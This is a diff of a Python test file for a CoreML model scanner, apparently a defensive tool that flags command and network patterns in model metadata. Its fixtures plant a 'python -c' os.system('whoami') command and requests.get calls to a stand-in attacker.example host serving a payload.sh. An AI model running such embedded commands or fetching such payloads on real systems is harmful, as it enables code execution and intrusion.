@@ -418,7 +418,7 @@ def test_coreml_scanner_detects_metadata_command_and_network_patterns(tmp_path: 
     description = _build_description(
         user_defined={
             "postprocess_script": "python -c 'import os; os.system(\"whoami\")'",
-            "model_url": "https://attacker.example/download",
+            "example": "requests.get('https://attacker.example/download')",
         }
     )
     malicious_model = _write_model(
@@ -440,7 +440,7 @@ def test_coreml_scanner_detects_metadata_command_and_network_patterns(tmp_path: 
     url_findings = [
         issue
         for issue in result.issues
-        if issue.details.get("metadata_key") == "model_url"
+        if issue.details.get("metadata_key") == "example"
         and "Suspicious network pattern in CoreML metadata key" in issue.message
     ]
 
@@ -451,10 +451,10 @@ def test_coreml_scanner_detects_metadata_command_and_network_patterns(tmp_path: 
     assert any("field_path" in issue.details for issue in result.issues)
 
 
-def test_coreml_scanner_safe_metadata_keys_still_scan_suspicious_urls(tmp_path: Path) -> None:
+def test_coreml_scanner_source_metadata_reference_is_passive(tmp_path: Path) -> None:
     description = _build_description(
         user_defined={
-            "com.github.apple.coremltools.source": "https://attacker.example/payload",
+            "com.github.apple.coremltools.source": "https://attacker.example/payload.sh",
         }
     )
     model_path = _write_model(
@@ -467,14 +467,10 @@ def test_coreml_scanner_safe_metadata_keys_still_scan_suspicious_urls(tmp_path: 
 
     result = CoreMLScanner().scan(str(model_path))
     findings = [
-        issue
-        for issue in result.issues
-        if issue.details.get("metadata_key") == "com.github.apple.coremltools.source"
-        and issue.details.get("pattern_type") == "network"
+        issue for issue in result.issues if issue.details.get("metadata_key") == "com.github.apple.coremltools.source"
     ]
 
-    assert findings
-    assert all(issue.severity == IssueSeverity.WARNING for issue in findings)
+    assert not findings
 
 
 def test_coreml_scanner_builtin_license_reference_url_is_informational(tmp_path: Path) -> None:
